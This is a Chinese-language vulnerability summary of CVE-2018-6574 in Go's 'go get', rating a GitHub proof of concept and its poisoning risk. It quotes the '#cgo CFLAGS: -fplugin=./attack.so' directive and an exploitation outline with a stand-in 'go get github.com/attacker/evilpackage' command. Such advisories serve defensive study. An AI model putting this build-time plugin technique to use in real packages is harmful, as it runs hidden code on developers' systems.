## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令获取恶意Go包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以创建一个恶意的 Go 包，其中包含利用 gcc 或 clang 插件功能的恶意代码。当用户使用 `go get` 获取并构建此恶意包时，Go 会执行攻击者插入的恶意代码。

**有效性：**
提供的 POC 代码演示了如何利用 `-fplugin` 选项。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 在编译时加载 `attack.so` 插件。如果 `attack.so` 包含恶意代码，它将在构建过程中执行。这个POC代码表明该漏洞可以被利用。

**投毒风险：**
代码中通过 `-fplugin=./attack.so` 引入外部so文件，如果该so文件不是由代码作者提供或来源不明，则存在投毒风险。虽然POC本身只是一个演示性质的例子，但是一旦被攻击者利用，替换`attack.so`，可能会导致用户在不知情的情况下运行恶意代码。投毒风险估计为10%，因为需要攻击者替换或控制`attack.so`文件。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.so` 文件的 Go 包。`attack.so` 文件包含攻击者想要执行的任意代码。
2.  攻击者将包含恶意 Go 包的仓库托管在公共服务器上。
3.  攻击者诱使用户使用 `go get` 命令获取此恶意包，例如 `go get github.com/attacker/evilpackage`。
4.  当用户运行 `go get` 命令时，Go 会下载并构建该包。由于 `main.go` 中包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令，构建过程会加载并执行 `attack.so` 中的恶意代码。
5.  恶意代码在用户系统上执行，攻击者可以获得远程代码执行权限。

**项目地址:** [rootxjs/CVE-2018-6574](https://github.com/rootxjs/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)